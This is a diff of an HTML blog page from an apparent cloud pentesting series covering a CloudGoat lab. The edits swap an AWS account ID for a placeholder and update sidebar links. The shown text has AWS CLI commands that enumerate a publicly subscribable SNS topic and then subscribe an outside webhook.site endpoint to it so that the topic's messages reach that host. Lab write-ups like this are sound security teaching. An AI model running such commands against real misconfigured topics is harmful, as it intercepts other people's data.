@@ -277,15 +277,15 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="/posts/cloud-security-6/">Hands on Cloud Pentesting: 6 - Cloudgoat sqs_flag_shop</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="/posts/smileyctf-2025/">SmileyCTF 2025 - Sculpture Revenge, dry-ice-n-co</a>
                             </li>
                         
                             <li class="bullet">
                                 <a href="/posts/cloud-security-5/">Hands on Cloud Pentesting: 5 - Cloudgoat lambda_privesc</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="/posts/cloud-security-4/">Hands on Cloud Pentesting: 4 - Cloudgoat iam_privesc_by_rollback</a>
                             </li>
                         
                     
@@ -524,15 +524,15 @@ Now lets run a simple whoami (<a href="https://awscli.amazonaws.com/v2/documenta
 <p>Since we have few permissions on SNS, lets try to see what we can find.
 <img src="image-4.png" alt="sns list topics">
 We can use the following command to get more information about the topic</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90 --profile sns_user
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90 --profile sns_user
 </span></span></code></pre></div><p>This gives an access control policy which allows anyone to subscribe to the topic and some other attributes</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Attributes&#34;</span>: {
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Policy&#34;</span>: <span style="color:#e6db74">&#34;{\&#34;Version\&#34;:\&#34;2012-10-17\&#34;,\&#34;Statement\&#34;:[{\&#34;Effect\&#34;:\&#34;Allow\&#34;,\&#34;Principal\&#34;:\&#34;*\&#34;,\&#34;Action\&#34;:[\&#34;sns:Subscribe\&#34;,\&#34;sns:Receive\&#34;,\&#34;sns:ListSubscriptionsByTopic\&#34;],\&#34;Resource\&#34;:\&#34;arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90\&#34;}]}&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Policy&#34;</span>: <span style="color:#e6db74">&#34;{\&#34;Version\&#34;:\&#34;2012-10-17\&#34;,\&#34;Statement\&#34;:[{\&#34;Effect\&#34;:\&#34;Allow\&#34;,\&#34;Principal\&#34;:\&#34;*\&#34;,\&#34;Action\&#34;:[\&#34;sns:Subscribe\&#34;,\&#34;sns:Receive\&#34;,\&#34;sns:ListSubscriptionsByTopic\&#34;],\&#34;Resource\&#34;:\&#34;arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90\&#34;}]}&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;LambdaSuccessFeedbackSampleRate&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Owner&#34;</span>: <span style="color:#e6db74">&#34;139343766080&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Owner&#34;</span>: <span style="color:#e6db74">&#34;1234567890&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;SubscriptionsPending&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;TopicArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;TopicArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;EffectiveDeliveryPolicy&#34;</span>: <span style="color:#e6db74">&#34;{\&#34;http\&#34;:{\&#34;defaultHealthyRetryPolicy\&#34;:{\&#34;minDelayTarget\&#34;:20,\&#34;maxDelayTarget\&#34;:20,\&#34;numRetries\&#34;:3,\&#34;numMaxDelayRetries\&#34;:0,\&#34;numNoDelayRetries\&#34;:0,\&#34;numMinDelayRetries\&#34;:0,\&#34;backoffFunction\&#34;:\&#34;linear\&#34;},\&#34;disableSubscriptionOverrides\&#34;:false,\&#34;defaultRequestPolicy\&#34;:{\&#34;headerContentType\&#34;:\&#34;text/plain; charset=UTF-8\&#34;}}}&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;FirehoseSuccessFeedbackSampleRate&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;SubscriptionsConfirmed&#34;</span>: <span style="color:#e6db74">&#34;0&#34;</span>,
@@ -544,7 +544,7 @@ We can use the following command to get more information about the topic</p>
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We can <a href="https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html" target="_blank">subscribe</a> to the topic with an http webhook to see what messages we receive.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:139343766080:public-topic-cgidhisns60b90 --protocol https --notification-endpoint https://webhook.site/8598152c-ae9a-499a-923b-88d36987e9cf  --profile sns_user
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sns subscribe --topic-arn arn:aws:sns:us-east-1:1234567890:public-topic-cgidhisns60b90 --protocol https --notification-endpoint https://webhook.site/8598152c-ae9a-499a-923b-88d36987e9cf  --profile sns_user
 </span></span></code></pre></div><p><img src="image-5.png" alt="subscribed">
 We receive a SubscribeURL which we have to visit to confirm the subscription.
 Once that is done, we can check our current subscriptions with the cli.
@@ -598,6 +598,13 @@ As part of enumeration, a common step is to try listing all API keys via:</p>
         <ul class="series">
             
             
+            
+            <li>
+                June 18, 2025 -
+                
+                    <a href="/posts/cloud-security-6/">Hands on Cloud Pentesting: 6 - Cloudgoat sqs_flag_shop</a>
+                
+            </li>
             
             <li>
                 June 13, 2025 -
